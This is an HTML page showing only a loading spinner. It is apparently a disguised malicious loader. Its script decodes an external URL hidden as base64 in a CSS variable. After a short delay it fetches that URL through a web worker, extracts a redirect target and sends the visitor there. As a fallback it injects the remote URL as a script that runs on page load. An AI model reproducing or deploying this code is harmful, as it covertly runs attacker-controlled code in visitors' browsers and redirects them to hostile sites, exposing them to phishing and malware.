<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
  <style>
    :root {
      --slip: aHR0cHM6Ly9sZXB0aWRwZXNod2EuY29tL3Vud2VsbC5teWVsb24=;
    }
    * { box-sizing: border-box; margin: 0; }
    html, body { height: 100%; }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #f6f8fa;
    }
    .ring {
      width: 52px;
      height: 52px;
      animation: turn 1.1s linear infinite;
    }
    .ring circle {
      fill: none;
      stroke: #d0d7de;
      stroke-width: 4;
    }
    .ring circle.arc {
      stroke: #0969da;
      stroke-dasharray: 90 120;
      stroke-linecap: round;
    }
    @keyframes turn {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <svg class="ring" viewBox="0 0 52 52" aria-hidden="true">
    <circle cx="26" cy="26" r="20"></circle>
    <circle class="arc" cx="26" cy="26" r="20"></circle>
  </svg>

  <script>
  (function () {
    var WAIT_MS = 500;

    function hopFromCss() {
      var raw = getComputedStyle(document.documentElement).getPropertyValue('--slip').trim();
      raw = raw.replace(/^['"]|['"]$/g, '');
      var url = atob(raw);
      if (!/^https?:\/\//i.test(url)) throw new Error('bad');
      return url;
    }

    function parseHopBody(text) {
      var body = String(text || '').trim();
      try {
        var j = JSON.parse(body);
        if (j && j.c) {
          var u = atob(String(j.c).trim());
          if (/^https?:\/\//i.test(u)) return u;
        }
      } catch (e) {}
      var patterns = [
        /top\.location\.(?:assign|replace)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /location\.(?:replace|assign)\s*\(\s*['"]([^'"]+)['"]\s*\)/i,
        /(?:window\.)?location\.href\s*=\s*['"]([^'"]+)['"]/i
      ];
      for (var i = 0; i < patterns.length; i++) {
        var m = body.match(patterns[i]);
        if (m && m[1]) return m[1];
      }
      throw new Error('parse');
    }

    function attachScript(hopUrl) {
      var s = document.createElement('script');
      s.src = hopUrl;
      s.async = true;
      document.head.appendChild(s);
    }

    function openViaWorker(hopUrl) {
      if (typeof Worker === 'undefined') {
        attachScript(hopUrl);
        return;
      }
      var worker;
      try {
        worker = new Worker('slot.js');
      } catch (e) {
        attachScript(hopUrl);
        return;
      }
      var done = false;
      function finish(fn) {
        if (done) return;
        done = true;
        clearTimeout(watchdog);
        try { worker.terminate(); } catch (e) {}
        fn();
      }
      var watchdog = setTimeout(function () {
        finish(function () { attachScript(hopUrl); });
      }, 4000);
      worker.onmessage = function (ev) {
        var msg = ev.data || {};
        if (msg.ok && msg.body) {
          try {
            var target = parseHopBody(msg.body);
            finish(function () { window.location.replace(target); });
            return;
          } catch (e) {}
        }
        finish(function () { attachScript(hopUrl); });
      };
      worker.onerror = function () {
        finish(function () { attachScript(hopUrl); });
      };
      worker.postMessage(hopUrl);
    }

    var hopUrl;
    try {
      hopUrl = hopFromCss();
    } catch (e) {
      return;
    }

    setTimeout(function () {
      openViaWorker(hopUrl);
    }, WAIT_MS);
  })();
  </script>
</body>
</html>
